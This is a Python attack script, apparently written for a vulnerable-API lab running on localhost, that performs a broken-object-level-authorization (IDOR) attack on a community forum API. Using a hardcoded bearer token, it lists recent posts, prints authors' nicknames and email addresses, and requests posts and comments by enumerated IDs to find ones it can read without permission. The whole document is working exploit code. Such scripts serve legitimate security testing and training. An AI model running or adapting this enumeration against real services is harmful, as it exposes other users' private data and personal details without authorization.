#!/usr/bin/env python3
import requests
import json

target = "http://localhost:8888"
token = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZWR0ZWFtQGhhY2tlci5jb20iLCJpYXQiOjE3Nzc1Njg1NDksImV4cCI6MTc3ODE3MzM0OSwicm9sZSI6InVzZXIifQ.K_CL2EMNv6th2e5xIN0TBFxOJv1Vd1I7xCY2Q3kayW-nkcPacfJZtwi4o-tYLWGbCiakk1x38m0RAw--TlGzxfrYnZLT9RCSSYD4lm-R-z7KK-vrKWoCL6WBcx6Xl_vee6pfzMeZEBbHU11qTcG85JZpO-HdbemSibohHnYXB8lMoAD_1TrFQLCHy30aYoXSILQX26w1LCMsnVWx0V_mwuSm10vyJfUfs3uiuDN4qtbsx4KDQG9G7Wfb6iGfTnOuR90jZmdbNuJNugIBEgPIF1CyHd4UkmWrjmNfz6ufRW9NDCkHtY3ZQv-pTTzrBNTVZtyCZDHqHDh8tlHQUJsLOg"

headers = {"Authorization": f"Bearer {token}"}

print("="*70)
print("[*] BOLA Attack - Community Posts")
print("="*70)

# 1. 최근 게시글 가져오기
print("\n[+] Fetching recent posts...")
r = requests.get(f"{target}/community/api/v2/community/posts/recent", headers=headers)

if r.status_code == 200:
    posts = r.json().get('posts', [])
    print(f"[+] Found {len(posts)} posts\n")
    
    for post in posts[:5]:  # 처음 5개만
        post_id = post.get('id')
        author = post.get('author', {})
        print(f"  Post ID: {post_id}")
        print(f"  Author: {author.get('nickname')} ({author.get('email')})")
        print(f"  Title: {post.get('title')}")
        print()
        
        # 2. 개별 게시글 접근 시도 (BOLA!)
        r2 = requests.get(f"{target}/community/api/v2/community/posts/{post_id}", headers=headers)
        if r2.status_code == 200:
            print(f"  [✓] Successfully accessed post {post_id}")
            detail = r2.json()
            if 'comments' in detail:
                print(f"      Comments: {len(detail.get('comments', []))}")
        elif r2.status_code == 403:
            print(f"  [!] Access denied to post {post_id}")
        else:
            print(f"  [?] Post {post_id}: Status {r2.status_code}")
        print("-" * 70)

# 3. 댓글 접근 시도
print("\n[+] Testing comment access...")
for comment_id in range(1, 10):
    r = requests.get(f"{target}/community/api/v2/community/posts/comments/{comment_id}", headers=headers)
    if r.status_code == 200:
        print(f"[VULN!] Comment {comment_id}: {r.text[:100]}")

print("\n" + "="*70)
print("[*] BOLA Test Complete!")
print("="*70)
